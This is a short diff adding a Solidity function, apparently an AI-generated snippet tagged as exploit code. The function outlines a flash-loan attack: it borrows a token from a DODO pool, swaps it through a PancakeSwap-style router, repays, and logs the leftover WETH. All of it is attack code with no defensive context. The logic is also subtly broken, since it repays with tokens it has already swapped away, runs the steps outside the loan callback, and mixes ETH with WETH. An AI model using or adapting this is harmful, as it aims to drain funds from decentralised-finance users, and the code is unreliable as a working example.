@@ -1,0 +1,33 @@
+```plaintext
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Flash Loan the Valuable Token
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+    
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = amount;
+
+    // Call flash loan from Dodo
+    IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
+
+    // Step 2: Swap the borrowed tokens for WETH on PancakeSwap
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
+
+    // Step 3: Repay the flashloan
+    uint256 repayAmount = amounts[0];
+    valuableToken.approve(flashloanProvider, repayAmount);
+    valuableToken.transfer(flashloanProvider, repayAmount);
+
+    // Step 4: Check the surplus WETH
+    uint256 surplusWETH = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    
+    // Print the surplus balance
+    console.log("Surplus WETH: ", surplusWETH);
+}
+</executeExploitCode>
+```
